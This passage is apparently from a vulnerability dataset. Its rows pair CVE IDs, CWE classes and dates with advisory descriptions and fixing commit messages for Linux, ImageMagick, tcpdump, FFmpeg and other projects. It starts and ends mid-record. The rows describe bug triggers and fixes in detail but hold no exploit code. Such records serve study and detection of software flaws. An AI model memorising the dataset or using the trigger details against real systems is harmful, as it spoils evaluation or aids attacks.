Now, in our scenario, we have 2 threads with 1 non-blocking SEQ_PACKET socket each, setting up common shared SCTP_AUTH_KEY and SCTP_AUTH_ACTIVE_KEY properly, and each of them calling sctp_bindx(3), listen(2) and connect(2) against each other, thus the handshake looks similar to this, e.g.:    ---------- INIT[RANDOM; CHUNKS; HMAC-ALGO] ---------->   <------- INIT-ACK[RANDOM; CHUNKS; HMAC-ALGO] ---------   <--------- INIT[RANDOM; CHUNKS; HMAC-ALGO] -----------   -------- INIT-ACK[RANDOM; CHUNKS; HMAC-ALGO] -------->   ...  Since such collisions can also happen with verification tags, the RFC4895 for AUTH rather vaguely says under section 6.1:    In case of INIT collision, the rules governing the handling   of this Random Number follow the same pattern as those for   the Verification Tag, as explained in Section 5.2.4 of   RFC 2960 [5]. Therefore, each endpoint knows its own Random   Number and the peer's Random Number after the association   has been established.  In RFC2960, section 5.2.4, we're eventually hitting Action B:    B) In this case, both sides may be attempting to start an      association at about the same time but the peer endpoint      started its INIT after responding to the local endpoint's      INIT. Thus it may have picked a new Verification Tag not      being aware of the previous Tag it had sent this endpoint.      The endpoint should stay in or enter the ESTABLISHED      state but it MUST update its peer's Verification Tag from      the State Cookie, stop any init or cookie timers that may      running and send a COOKIE ACK.  In other words, the handling of the Random parameter is the same as behavior for the Verification Tag as described in Action B of section 5.2.4.  Looking at the code, we exactly hit the sctp_sf_do_dupcook_b() case which triggers an SCTP_CMD_UPDATE_ASSOC command to the side effect interpreter, and in fact it properly copies over peer_{random, hmacs, chunks} parameters from the newly created association to update the existing one.  Also, the old asoc_shared_key is being released and based on the new params, sctp_auth_asoc_init_active_key() updated. However, the issue observed in this case is that the previous asoc->peer.auth_capable was 0, and has *not* been updated, so that instead of creating a new secret, we're doing an early return from the function sctp_auth_asoc_init_active_key() leaving asoc->asoc_shared_key as NULL. However, we now have to authenticate chunks from the updated chunk list (e.g. COOKIE-ACK).  That in fact causes the server side when responding with ...    <------------------ AUTH; COOKIE-ACK -----------------  ... to trigger a NULL pointer dereference, since in sctp_packet_transmit(), it discovers that an AUTH chunk is being queued for xmit, and thus it calls sctp_auth_calculate_hmac().  Since the asoc->active_key_id is still inherited from the endpoint, and the same as encoded into the chunk, it uses asoc->asoc_shared_key, which is still NULL, as an asoc_key and dereferences it in ...    crypto_hash_setkey(desc.tfm, &asoc_key->data[0], asoc_key->len)  ... causing an oops. All this happens because sctp_make_cookie_ack() called with the *new* association has the peer.auth_capable=1 and therefore marks the chunk with auth=1 after checking sctp_auth_send_cid(), but it is *actually* sent later on over the then *updated* association's transport that didn't initialize its shared key due to peer.auth_capable=0. Since control chunks in that case are not sent by the temporary association which are scheduled for deletion, they are issued for xmit via SCTP_CMD_REPLY in the interpreter with the context of the *updated* association. peer.auth_capable was 0 in the updated association (which went from COOKIE_WAIT into ESTABLISHED state), since all previous processing that performed sctp_process_init() was being done on temporary associations, that we eventually throw away each time.  The correct fix is to update to the new peer.auth_capable value as well in the collision case via sctp_assoc_update(), so that in case the collision migrated from 0 -> 1, sctp_auth_asoc_init_active_key() can properly recalculate the secret. This therefore fixes the observed server panic.  Fixes: 730fc3d (""[SCTP]: Implete SCTP-AUTH parameter processing"") Reported-by: Jason Gunthorpe <jgunthorpe@obsidianresearch.com> Signed-off-by: Daniel Borkmann <dborkman@redhat.com> Tested-by: Jason Gunthorpe <jgunthorpe@obsidianresearch.com> Cc: Vlad Yasevich <vyasevich@gmail.com> Acked-by: Vlad Yasevich <vyasevich@gmail.com> Signed-off-by: David S. Miller <davem@davemloft.net>"
CVE-2016-7513,CWE-189,2017-04-20,Off-by-one error in magick/cache.c in ImageMagick allows remote attackers to cause a denial of service (segmentation fault) via unspecified vectors.,
CVE-2019-1010294,CWE-189,2019-07-15,Linaro/OP-TEE OP-TEE 3.3.0 and earlier is affected by: Rounding error. The impact is: Potentially leaking code and/or data from previous Trusted Application. The component is: optee_os. The fixed version is: 3.4.0 and later.,"Previously we cleared (memset to zero) the size corresponding to code and data segments, however the allocation for the TA is made on the granularity of the memory pool, meaning that we did not clear all memory and because of that we could potentially leak code and data of a previous loaded TA.  Fixes: OP-TEE-2018-0006: ""Potential disclosure of previously loaded TA code and data""  Signed-off-by: Joakim Bech <joakim.bech@linaro.org> Tested-by: Joakim Bech <joakim.bech@linaro.org> (QEMU v7, v8) Suggested-by: Jens Wiklander <jens.wiklander@linaro.org> Reviewed-by: Jens Wiklander <jens.wiklander@linaro.org> Reported-by: Riscure <inforequest@riscure.com> Reported-by: Alyssa Milburn <a.a.milburn@vu.nl> Acked-by: Etienne Carriere <etienne.carriere@linaro.org>"
CVE-2016-2550,CWE-399,2016-04-27,The Linux kernel before 4.5 allows local users to bypass file-descriptor limits and cause a denial of service (memory consumption) by leveraging incorrect tracking of descriptor ownership and sending each descriptor over a UNIX socket before closing it. NOTE: this vulnerability exists because of an incorrect fix for CVE-2013-4312.,"The commit referenced in the Fixes tag incorrectly accounted the number of in-flight fds over a unix domain socket to the original opener of the file-descriptor. This allows another process to arbitrary deplete the original file-openers resource limit for the maximum of open files. Instead the sending processes and its struct cred should be credited.  To do so, we add a reference counted struct user_struct pointer to the scm_fp_list and use it to account for the number of inflight unix fds.  Fixes: 712f4aa (""unix: properly account for FDs passed over unix sockets"") Reported-by: David Herrmann <dh.herrmann@gmail.com> Cc: David Herrmann <dh.herrmann@gmail.com> Cc: Willy Tarreau <w@1wt.eu> Cc: Linus Torvalds <torvalds@linux-foundation.org> Suggested-by: Linus Torvalds <torvalds@linux-foundation.org> Signed-off-by: Hannes Frederic Sowa <hannes@stressinduktion.org> Signed-off-by: David S. Miller <davem@davemloft.net>"
CVE-2015-3887,CWE-426,2017-09-21,"Untrusted search path vulnerability in ProxyChains-NG before 4.9 allows local users to gain privileges via a Trojan horse libproxychains4.so library in the current working directory, which is referenced in the LD_PRELOAD path.",closes #60
CVE-2017-9075,,2017-05-19,"The sctp_v6_create_accept_sk function in net/sctp/ipv6.c in the Linux kernel through 4.11.1 mishandles inheritance, which allows local users to cause a denial of service or possibly have unspecified other impact via crafted system calls, a related issue to CVE-2017-8890.","SCTP needs fixes similar to 83eadda (""ipv6/dccp: do not inherit ipv6_mc_list from parent""), otherwise bad things can happen.  Signed-off-by: Eric Dumazet <edumazet@google.com> Reported-by: Andrey Konovalov <andreyknvl@google.com> Tested-by: Andrey Konovalov <andreyknvl@google.com> Signed-off-by: David S. Miller <davem@davemloft.net>"
CVE-2017-0375,CWE-617,2017-06-09,The hidden-service feature in Tor before 0.3.0.8 allows a denial of service (assertion failure and daemon exit) in the relay_send_end_cell_from_edge_ function via a malformed BEGIN cell.,This fixes an assertion failure in relay_send_end_cell_from_edge_() when an origin circuit and a cpath_layer = NULL were passed.  A service rendezvous circuit could do such a thing when a malformed BEGIN cell is received but shouldn't in the first place because the service needs to send an END cell on the circuit for which it can not do without a cpath_layer.  Fixes #22493  Reported-by: Roger Dingledine <arma@torproject.org> Signed-off-by: David Goulet <dgoulet@torproject.org>
CVE-2019-14763,CWE-667,2019-08-07,"In the Linux kernel before 4.16.4, a double-locking error in drivers/usb/dwc3/gadget.c may potentially cause a deadlock with f_hid.","In f_hidg_write() the write_spinlock is acquired before calling usb_ep_queue() which causes a deadlock when dummy_hcd is being used. This is because dummy_queue() callbacks into f_hidg_req_complete() which tries to acquire the same spinlock. This is (part of) the backtrace when the deadlock occurs:    0xffffffffc06b1410 in f_hidg_req_complete   0xffffffffc06a590a in usb_gadget_giveback_request   0xffffffffc06cfff2 in dummy_queue   0xffffffffc06a4b96 in usb_ep_queue   0xffffffffc06b1eb6 in f_hidg_write   0xffffffff8127730b in __vfs_write   0xffffffff812774d1 in vfs_write   0xffffffff81277725 in SYSC_write  Fix this by releasing the write_spinlock before calling usb_ep_queue()  Reviewed-by: James Bottomley <James.Bottomley@HansenPartnership.com> Tested-by: James Bottomley <James.Bottomley@HansenPartnership.com> Cc: stable@vger.kernel.org # 4.11+ Fixes: 749494b (""usb: gadget: f_hid: fix: Move IN request allocation to set_alt()"") Signed-off-by: Radoslav Gerganov <rgerganov@vmware.com> Signed-off-by: Felipe Balbi <felipe.balbi@linux.intel.com>"
CVE-2017-12991,CWE-125,2017-09-14,The BGP parser in tcpdump before 4.9.2 has a buffer over-read in print-bgp.c:bgp_attr_print().,This fixes a buffer over-read discovered by Forcepoint's security researchers Otto Airamo & Antti Levomäki.  Add a test using the capture file supplied by the reporter(s).
CVE-2016-5359,CWE-119,2016-08-07,"epan/dissectors/packet-wbxml.c in the WBXML dissector in Wireshark 1.12.x before 1.12.12 mishandles offsets, which allows remote attackers to cause a denial of service (integer overflow and infinite loop) via a crafted packet.","This is a naive approach allowing to detact that something went wrong, without the need to replace all proto_tree_add_text() calls as what was done in master-2.0 branch.  Bug: 12408 Change-Id: Ia14905005e17ae322c2fc639ad5e491fa08b0108 Reviewed-on: https://code.wireshark.org/review/15310 Reviewed-by: Michael Mann <mmann78@netscape.net> Reviewed-by: Pascal Quantin <pascal.quantin@gmail.com>"
CVE-2016-9601,CWE-119,2018-04-24,"ghostscript before version 9.21 is vulnerable to a heap based buffer overflow that was found in the ghostscript jbig2_decode_gray_scale_image function which is used to decode halftone segments in a JBIG2 image. A document (PostScript or PDF) with an embedded, specially crafted, jbig2 image could trigger a segmentation fault in ghostscript.",
CVE-2017-11328,CWE-119,2017-07-17,Heap buffer overflow in the yr_object_array_set_item() function in object.c in YARA 3.x allows a denial-of-service attack by scanning a crafted .NET file.,"When setting a new array item with yr_object_array_set_item() the array size is doubled if the index for the new item is larger than the already allocated ones. No further checks were made to ensure that the index fits into the array after doubling its capacity. If the array capacity was for example 64, and a new object is assigned to an index larger than 128 the overflow occurs. As yr_object_array_set_item() is usually invoked with indexes that increase monotonically by one, this bug never triggered before. But the new ""dotnet"" module has the potential to allow the exploitation of this bug by scanning a specially crafted .NET binary."
CVE-2014-0749,CWE-119,2014-05-16,Stack-based buffer overflow in lib/Libdis/disrsi_.c in Terascale Open-Source Resource and Queue Manager (aka TORQUE Resource Manager) 2.5.x through 2.5.13 allows remote attackers to execute arbitrary code via a large count value.,
CVE-2017-12643,CWE-770,2017-08-07,ImageMagick 7.0.6-1 has a memory exhaustion vulnerability in ReadOneJNGImage in coders\png.c.,
CVE-2018-13302,CWE-129,2018-07-05,"In FFmpeg 4.0.1, improper handling of frame types (other than EAC3_FRAME_TYPE_INDEPENDENT) that have multiple independent substreams in the handle_eac3 function in libavformat/movenc.c may trigger an out-of-array access while converting a crafted AVI file to MPEG4, leading to a denial of service or possibly unspecified other impact.","Fixes: out of array access Fixes: ffmpeg_bof_1.avi  Found-by: Thuan Pham, Marcel Böhme, Andrew Santosa and Alexandru Razvan Caciulescu with AFLSmart Signed-off-by: Michael Niedermayer <michael@niedermayer.cc>"
CVE-2016-8674,CWE-416,2017-02-15,The pdf_to_num function in pdf-object.c in MuPDF before 1.10 allows remote attackers to cause a denial of service (use-after-free and application crash) via a crafted file.,
CVE-2017-9144,CWE-20,2017-05-22,"In ImageMagick 7.0.5-5, a crafted RLE image can trigger a crash because of incorrect EOF handling in coders/rle.c.",
CVE-2016-10156,CWE-264,2017-01-23,"A flaw in systemd v228 in /src/basic/fs-util.c caused world writable suid files to be created when using the systemd timers features, allowing local attackers to escalate their privileges to root. This is fixed in v229.","mode_t is unsigned, so MODE_INVALID < 0 can never be true.  This fixes a possible DoS where any user could fill /run by writing to a world-writable /run/systemd/show-status."
CVE-2019-13454,CWE-369,2019-07-09,ImageMagick 7.0.1-0 to 7.0.8-54 Q16 allows Division by Zero in RemoveDuplicateLayers in MagickCore/layer.c.,
CVE-2018-14016,CWE-125,2018-07-12,The r_bin_mdmp_init_directory_entry function in mdmp.c in radare2 2.7.0 allows remote attackers to cause a denial of service (heap-based buffer over-read and application crash) via a crafted Mini Crash Dump file.,
CVE-2019-13135,CWE-908,2019-07-01,"ImageMagick before 7.0.8-50 has a ""use of uninitialized value"" vulnerability in the function ReadCUTImage in coders/cut.c.",
CVE-2017-7526,CWE-200,2018-07-26,libgcrypt before version 1.7.8 is vulnerable to a cache side-channel attack resulting into a complete break of RSA-1024 while using the left-to-right method for computing the sliding-window expansion. The same attack is believed to work on RSA-2048 with moderately more computation. This side-channel requires that attacker can run arbitrary software on the hardware where the private RSA key is used.,
CVE-2016-1583,CWE-119,2016-06-27,"The ecryptfs_privileged_open function in fs/ecryptfs/kthread.c in the Linux kernel before 4.6.3 allows local users to gain privileges or cause a denial of service (stack memory consumption) via vectors involving crafted mmap calls for /proc pathnames, leading to recursive pagefault handling.",This prevents users from triggering a stack overflow through a recursive invocation of pagefault handling that involves mapping procfs files into virtual memory.  Signed-off-by: Jann Horn <jannh@google.com> Acked-by: Tyler Hicks <tyhicks@canonical.com> Cc: stable@vger.kernel.org Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>
CVE-2017-9618,CWE-119,2017-07-26,The xps_load_sfnt_name function in xps/xpsfont.c in Artifex Ghostscript GhostXPS 9.21 allows remote attackers to cause a denial of service (buffer overflow and application crash) or possibly have unspecified other impact via a crafted document.,
CVE-2016-2860,CWE-284,2016-05-13,The newEntry function in ptserver/ptprocs.c in OpenAFS before 1.6.17 allows remote authenticated users from foreign Kerberos realms to bypass intended access restrictions and create arbitrary groups as administrators by leveraging mishandling of the creator ID.,
CVE-2011-2161,CWE-399,2011-05-20,"The ape_read_header function in ape.c in libavformat in FFmpeg before 0.5.4, as used in MPlayer, VideoLAN VLC media player, and other products, allows remote attackers to cause a denial of service (application crash) via an APE (aka Monkey's Audio) file that contains a header but no frames.",This fixes invalid reads/writes with this sample: http://packetstorm.linuxsecurity.com/1103-exploits/vlc105-dos.txt
CVE-2018-14880,CWE-125,2019-10-03,The OSPFv3 parser in tcpdump before 4.9.3 has a buffer over-read in print-ospf6.c:ospf6_print_lshdr().,Need to test bounds check for the last field of the structure lsa6_hdr. No need to test other fields.  Include Security working under the Mozilla SOS program had independently identified this vulnerability in 2018 by means of code audit.  Wang Junjie of 360 ESG Codesafe Team had independently identified this vulnerability in 2018 by means of fuzzing and provided the packet capture file for the test.
CVE-2016-2117,CWE-200,2016-05-02,"The atl2_probe function in drivers/net/ethernet/atheros/atlx/atl2.c in the Linux kernel through 4.5.2 incorrectly enables scatter/gather I/O, which allows remote attackers to obtain sensitive information from kernel memory by reading packet data.","atl2 includes NETIF_F_SG in hw_features even though it has no support for non-linear skbs.  This bug was originally harmless since the driver does not claim to implement checksum offload and that used to be a requirement for SG.  Now that SG and checksum offload are independent features, if you explicitly enable SG *and* use one of the rare protocols that can use SG without checkusm offload, this potentially leaks sensitive information (before you notice that it just isn't working).  Therefore this obscure bug has been designated CVE-2016-2117.  Reported-by: Justin Yackoski <jyackoski@crypto-nite.com> Signed-off-by: Ben Hutchings <ben@decadent.org.uk> Fixes: ec5f061 (""net: Kill link between CSUM and SG features."") Signed-off-by: David S. Miller <davem@davemloft.net>"
CVE-2019-15921,CWE-401,2019-09-04,An issue was discovered in the Linux kernel before 5.0.6. There is a memory leak issue when idr_alloc() fails in genl_register_family() in net/netlink/genetlink.c.,
CVE-2017-6903,,2017-03-14,"In ioquake3 before 2017-03-14, the auto-downloading feature has insufficient content restrictions. This also affects Quake III Arena, OpenArena, OpenJK, iortcw, and other id Tech 3 (aka Quake 3 engine) forks. A malicious auto-downloaded file can trigger loading of crafted auto-downloaded files as native code DLLs. A malicious auto-downloaded file can contain configuration defaults that override the user's. Executable bytecode in a malicious auto-downloaded file can set configuration variables to values that will result in unwanted native code DLLs being loaded, resulting in sandbox escape.",Thanks Ensiform. JACoders/OpenJK@05928a57f9e4aae15a3bd0 JACoders/OpenJK@ef124fd0fc48af164581176
CVE-2017-17852,CWE-119,2017-12-27,kernel/bpf/verifier.c in the Linux kernel through 4.14.8 allows local users to cause a denial of service (memory corruption) or possibly have unspecified other impact by leveraging mishandling of 32-bit ALU ops.,"32-bit ALU ops operate on 32-bit values and have 32-bit outputs. Adjust the verifier accordingly.  Fixes: f1174f7 (""bpf/verifier: rework value tracking"") Signed-off-by: Jann Horn <jannh@google.com> Signed-off-by: Alexei Starovoitov <ast@kernel.org> Signed-off-by: Daniel Borkmann <daniel@iogearbox.net>"
CVE-2013-4265,,2013-11-23,"The av_reallocp_array function in libavutil/mem.c in FFmpeg before 2.0.1 has an unspecified impact and remote vectors related to a ""wrong return code"" and a resultant NULL pointer dereference.",Fixes return code and later null pointer dereference  Found-by: Laurent Butti <laurentb@gmail.com> Signed-off-by: Michael Niedermayer <michaelni@gmx.at>
CVE-2016-8887,CWE-476,2017-03-23,The jp2_colr_destroy function in libjasper/jp2/jp2_cod.c in JasPer before 1.900.10 allows remote attackers to cause a denial of service (NULL pointer dereference).,been constructed in the first place.
CVE-2018-5344,CWE-362,2018-01-12,"In the Linux kernel through 4.14.13, drivers/block/loop.c mishandles lo_release serialization, which allows attackers to cause a denial of service (__lock_acquire use-after-free) or possibly have unspecified other impact.","范龙飞 reports that KASAN can report a use-after-free in __lock_acquire. The reason is due to insufficient serialization in lo_release(), which will continue to use the loop device even after it has decremented the lo_refcnt to zero.  In the meantime, another process can come in, open the loop device again as it is being shut down. Confusion ensues.  Reported-by: 范龙飞 <long7573@126.com> Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org> Signed-off-by: Jens Axboe <axboe@kernel.dk>"
CVE-2017-11664,CWE-125,2017-08-17,The _WM_SetupMidiEvent function in internal_midi.c:2122 in WildMIDI 0.4.2 can cause a denial of service (invalid memory read and application crash) via a crafted mid file.,"CVE-2017-11661, CVE-2017-11662, CVE-2017-11663, CVE-2017-11664: Add a new size parameter to _WM_SetupMidiEvent() so that it knows where to stop reading, and adjust its clients properly."
CVE-2016-5357,CWE-20,2016-08-07,"wiretap/netscreen.c in the NetScreen file parser in Wireshark 1.12.x before 1.12.12 and 2.x before 2.0.4 mishandles sscanf unsigned-integer processing, which allows remote attackers to cause a denial of service (application crash) via a crafted file.","The scanf family of functions are as annoyingly bad at handling unsigned numbers as strtoul() is - both of them are perfectly willing to accept a value beginning with a negative sign as an unsigned value.  When using strtoul(), you can compensate for this by explicitly checking for a '-' as the first character of the string, but you can't do that with sscanf().  So revert to having pkt_len be signed, and scanning it with %d, but check for a negative value and fail if we see a negative value.  Bug: 12396 Change-Id: I54fe8f61f42c32b5ef33da633ece51bbcda8c95f Reviewed-on: https://code.wireshark.org/review/15220 Reviewed-by: Guy Harris <guy@alum.mit.edu>"
CVE-2016-7527,CWE-125,2017-04-20,coders/wpg.c in ImageMagick allows remote attackers to cause a denial of service (out-of-bounds read) via a crafted file.,
CVE-2015-5706,CWE-416,2015-08-31,Use-after-free vulnerability in the path_openat function in fs/namei.c in the Linux kernel 3.x and 4.x before 4.0.4 allows local users to cause a denial of service or possibly have unspecified other impact via O_TMPFILE filesystem operations that leverage a duplicate cleanup operation.,"path_openat() jumps to the wrong place after do_tmpfile() - it has already done path_cleanup() (as part of path_lookupat() called by do_tmpfile()), so doing that again can lead to double fput().  Cc: stable@vger.kernel.org	# v3.11+ Signed-off-by: Al Viro <viro@zeniv.linux.org.uk>"
CVE-2013-6371,CWE-310,2014-04-22,"The hash functionality in json-c before 0.12 allows context-dependent attackers to cause a denial of service (CPU consumption) via crafted JSON data, involving collisions.",* CVE-2013-6371: hash collision denial of service * CVE-2013-6370: buffer overflow if size_t is larger than int
CVE-2011-2918,CWE-400,2012-05-24,"The Performance Events subsystem in the Linux kernel before 3.1 does not properly handle event overflows associated with PERF_COUNT_SW_CPU_CLOCK events, which allows local users to cause a denial of service (system hang) via a crafted application.",
CVE-2017-8929,CWE-416,2017-05-14,The sized_string_cmp function in libyara/sizedstr.c in YARA 3.5.0 allows remote attackers to cause a denial of service (use-after-free and application crash) via a crafted rule.,
CVE-2017-5511,CWE-119,2017-03-24,"coders/psd.c in ImageMagick allows remote attackers to have unspecified impact by leveraging an improper cast, which triggers a heap-based buffer overflow.",
CVE-2014-6418,CWE-399,2014-09-28,"net/ceph/auth_x.c in Ceph, as used in the Linux kernel before 3.16.3, does not properly validate auth replies, which allows remote attackers to cause a denial of service (system crash) or possibly have unspecified other impact via crafted data from the IP address of a Ceph Monitor.",
CVE-2012-6548,CWE-200,2013-03-15,"The udf_encode_fh function in fs/udf/namei.c in the Linux kernel before 3.6 does not initialize a certain structure member, which allows local users to obtain sensitive information from kernel heap memory via a crafted application.",For type 0x51 the udf.parent_partref member in struct fid gets copied uninitialized to userland. Fix this by initializing it to 0.  Signed-off-by: Mathias Krause <minipli@googlemail.com> Signed-off-by: Jan Kara <jack@suse.cz>
CVE-2017-10671,CWE-119,2017-06-29,Heap-based Buffer Overflow in the de_dotdot function in libhttpd.c in sthttpd before 2.27.1 allows remote attackers to cause a denial of service (daemon crash) or possibly have unspecified other impact via a crafted filename.,
CVE-2016-10746,CWE-254,2019-04-18,"libvirt-domain.c in libvirt before 1.3.1 supports virDomainGetTime API calls by guest agents with an RO connection, even though an RW connection was supposed to be required, a different vulnerability than CVE-2019-3886.",We have a policy that if API may end up talking to a guest agent it should require RW connection. We don't obey the rule in virDomainGetTime().  Signed-off-by: Michal Privoznik <mprivozn@redhat.com>
CVE-2017-8294,CWE-125,2017-04-27,libyara/re.c in the regex component in YARA 3.5.0 allows remote attackers to cause a denial of service (out-of-bounds read and application crash) via a crafted rule that is mishandled in the yr_re_exec function.,* Fix issue #646 and some edge cases with wide regexps using \b and \B  * Rename function IS_WORD_CHAR to _yr_re_is_word_char
CVE-2019-15919,CWE-416,2019-09-04,An issue was discovered in the Linux kernel before 5.0.10. SMB2_write in fs/cifs/smb2pdu.c has a use-after-free.,"There is a KASAN use-after-free: BUG: KASAN: use-after-free in SMB2_write+0x1342/0x1580 Read of size 8 at addr ffff8880b6a8e450 by task ln/4196  Should not release the 'req' because it will use in the trace.  Fixes: eccb442 (""smb3: Add ftrace tracepoints for improved SMB3 debugging"")  Signed-off-by: ZhangXiaoxu <zhangxiaoxu5@huawei.com> Signed-off-by: Steve French <stfrench@microsoft.com> CC: Stable <stable@vger.kernel.org> 4.18+ Reviewed-by: Pavel Shilovsky <pshilov@microsoft.com>"
CVE-2017-13014,CWE-125,2017-09-14,"The White Board protocol parser in tcpdump before 4.9.2 has a buffer over-read in print-wb.c:wb_prep(), several functions.","This fixes a buffer over-read discovered by Yannick Formaggio.  Add a test using the capture file supplied by the reporter(s).  While we're at it, print a truncation error if the packets are truncated, rather than just, in effect, ignoring the result of the routines that print particular packet types."
CVE-2018-7186,CWE-787,2018-02-16,"Leptonica before 1.75.3 does not limit the number of characters in a %s format argument to fscanf or sscanf, which allows remote attackers to cause a denial of service (stack-based buffer overflow) or possibly have unspecified other impact via a long string, as demonstrated by the gplotRead and ptaReadStream functions.",* Fixed a debian security issue with fscanf() reading a string with   possible buffer overflow. * There were also a few similar situations with sscanf().
CVE-2016-7906,CWE-416,2017-01-18,magick/attribute.c in ImageMagick 7.0.3-2 allows remote attackers to cause a denial of service (use-after-free) via a crafted file.,
CVE-2019-1549,CWE-330,2019-09-10,OpenSSL 1.1.1 introduced a rewritten random number generator (RNG). This was intended to include protection in the event of a fork() system call in order to ensure that the parent and child processes did not share the same RNG state. However this protection was not being used in the default case. A partial mitigation for this issue is that the output from a high precision timer is mixed into the RNG state so the likelihood of a parent and child process sharing state is significantly reduced. If an application already calls OPENSSL_init_crypto() explicitly using OPENSSL_INIT_ATFORK then this problem does not occur at all. Fixed in OpenSSL 1.1.1d (Affected 1.1.1-1.1.1c).,
CVE-2014-4342,CWE-119,2014-07-20,"MIT Kerberos 5 (aka krb5) 1.7.x through 1.12.x before 1.12.2 allows remote attackers to cause a denial of service (buffer over-read or NULL pointer dereference, and application crash) by injecting invalid tokens into a GSSAPI application session.","Detect the following cases which would otherwise cause invalid memory accesses and/or integer underflow:  * An RFC 1964 token being processed by an RFC 4121-only context   [CVE-2014-4342]  * A header with fewer than 22 bytes after the token ID or an   incomplete checksum [CVE-2014-4341 CVE-2014-4342]  * A ciphertext shorter than the confounder [CVE-2014-4341]  * A declared padding length longer than the plaintext [CVE-2014-4341]  If we detect a bad pad byte, continue on to compute the checksum to avoid creating a padding oracle, but treat the checksum as invalid even if it compares equal.  CVE-2014-4341:  In MIT krb5, an unauthenticated remote attacker with the ability to inject packets into a legitimately established GSSAPI application session can cause a program crash due to invalid memory references when attempting to read beyond the end of a buffer.      CVSSv2 Vector: AV:N/AC:M/Au:N/C:N/I:N/A:P/E:POC/RL:OF/RC:C  CVE-2014-4342:  In MIT krb5 releases krb5-1.7 and later, an unauthenticated remote attacker with the ability to inject packets into a legitimately established GSSAPI application session can cause a program crash due to invalid memory references when reading beyond the end of a buffer or by causing a null pointer dereference.      CVSSv2 Vector: AV:N/AC:M/Au:N/C:N/I:N/A:P/E:POC/RL:OF/RC:C  [tlyu@mit.edu: CVE summaries, CVSS]  (cherry picked from commit fb99962)  ticket: 7949 version_fixed: 1.12.2 status: resolved"
CVE-2019-1010315,CWE-369,2019-07-11,WavPack 5.1 and earlier is affected by: CWE 369: Divide by Zero. The impact is: Divide by zero can lead to sudden crash of a software/service that tries to parse a .wav file. The component is: ParseDsdiffHeaderConfig (dsdiff.c:282). The attack vector is: Maliciously crafted .wav file. The fixed version is: After commit https://github.com/dbry/WavPack/commit/4c0faba32fddbd0745cbfaf1e1aeb3da5d35b9fc.,
CVE-2014-3980,CWE-264,2014-06-11,"libfep 0.0.5 before 0.1.0 does not properly use UNIX domain sockets in the abstract namespace, which allows local users to gain privileges via unspecified vectors.",
CVE-2015-7540,CWE-399,2015-12-29,"The LDAP server in the AD domain controller in Samba 4.x before 4.1.22 does not check return values to ensure successful ASN.1 memory allocation, which allows remote attackers to cause a denial of service (memory consumption and daemon crash) via crafted packets.",
CVE-2015-8852,,2016-04-25,"Varnish 3.x before 3.0.7, when used in certain stacked installations, allows remote attackers to inject arbitrary HTTP headers and conduct HTTP response splitting attacks via a header line terminated by a \r (carriage return) character in conjunction with multiple Content-Length headers in an HTTP request.","If a duplicate CL header is in the request, we fail the request with a 400 (Bad Request)  Fix a test case that was sending duplicate CL by misstake and would not fail because of that."
CVE-2018-14470,CWE-125,2019-10-03,The Babel parser in tcpdump before 4.9.3 has a buffer over-read in print-babel.c:babel_print_v2().,"In babel_print_v2() the non-verbose branch for an Update TLV compared the TLV Length against 1 instead of 10 (probably a typo), put it right.  This fixes a buffer over-read discovered by Henri Salo from Nixu Corporation.  Add a test using the capture file supplied by the reporter(s)."
CVE-2013-4163,CWE-399,2013-07-29,"The ip6_append_data_mtu function in net/ipv6/ip6_output.c in the IPv6 implementation in the Linux kernel through 3.10.3 does not properly maintain information about whether the IPV6_MTU setsockopt option had been specified, which allows local users to cause a denial of service (BUG and system crash) via a crafted application that uses the UDP_CORK option in a setsockopt system call.","If the socket had an IPV6_MTU value set, ip6_append_data_mtu lost track of this when appending the second frame on a corked socket. This results in the following splat:  [37598.993962] ------------[ cut here ]------------ [37598.994008] kernel BUG at net/core/skbuff.c:2064! [37598.994008] invalid opcode: 0000 [#1] SMP [37598.994008] Modules linked in: tcp_lp uvcvideo videobuf2_vmalloc videobuf2_memops videobuf2_core videodev media vfat fat usb_storage fuse ebtable_nat xt_CHECKSUM bridge stp llc ipt_MASQUERADE nf_conntrack_netbios_ns nf_conntrack_broadcast ip6table_mangle ip6t_REJECT nf_conntrack_ipv6 nf_defrag_ipv6 iptable_nat +nf_nat_ipv4 nf_nat iptable_mangle nf_conntrack_ipv4 nf_defrag_ipv4 xt_conntrack nf_conntrack ebtable_filter ebtables ip6table_filter ip6_tables be2iscsi iscsi_boot_sysfs bnx2i cnic uio cxgb4i cxgb4 cxgb3i cxgb3 mdio libcxgbi ib_iser rdma_cm ib_addr iw_cm ib_cm ib_sa ib_mad ib_core iscsi_tcp libiscsi_tcp libiscsi +scsi_transport_iscsi rfcomm bnep iTCO_wdt iTCO_vendor_support snd_hda_codec_conexant arc4 iwldvm mac80211 snd_hda_intel acpi_cpufreq mperf coretemp snd_hda_codec microcode cdc_wdm cdc_acm [37598.994008]  snd_hwdep cdc_ether snd_seq snd_seq_device usbnet mii joydev btusb snd_pcm bluetooth i2c_i801 e1000e lpc_ich mfd_core ptp iwlwifi pps_core snd_page_alloc mei cfg80211 snd_timer thinkpad_acpi snd tpm_tis soundcore rfkill tpm tpm_bios vhost_net tun macvtap macvlan kvm_intel kvm uinput binfmt_misc +dm_crypt i915 i2c_algo_bit drm_kms_helper drm i2c_core wmi video [37598.994008] CPU 0 [37598.994008] Pid: 27320, comm: t2 Not tainted 3.9.6-200.fc18.x86_64 #1 LENOVO 27744PG/27744PG [37598.994008] RIP: 0010:[<ffffffff815443a5>]  [<ffffffff815443a5>] skb_copy_and_csum_bits+0x325/0x330 [37598.994008] RSP: 0018:ffff88003670da18  EFLAGS: 00010202 [37598.994008] RAX: ffff88018105c018 RBX: 0000000000000004 RCX: 00000000000006c0 [37598.994008] RDX: ffff88018105a6c0 RSI: ffff88018105a000 RDI: ffff8801e1b0aa00 [37598.994008] RBP: ffff88003670da78 R08: 0000000000000000 R09: ffff88018105c040 [37598.994008] R10: ffff8801e1b0aa00 R11: 0000000000000000 R12: 000000000000fff8 [37598.994008] R13: 00000000000004fc R14: 00000000ffff0504 R15: 0000000000000000 [37598.994008] FS:  00007f28eea59740(0000) GS:ffff88023bc00000(0000) knlGS:0000000000000000 [37598.994008] CS:  0010 DS: 0000 ES: 0000 CR0: 000000008005003b [37598.994008] CR2: 0000003d935789e0 CR3: 00000000365cb000 CR4: 00000000000407f0 [37598.994008] DR0: 0000000000000000 DR1: 0000000000000000 DR2: 0000000000000000 [37598.994008] DR3: 0000000000000000 DR6: 00000000ffff0ff0 DR7: 0000000000000400 [37598.994008] Process t2 (pid: 27320, threadinfo ffff88003670c000, task 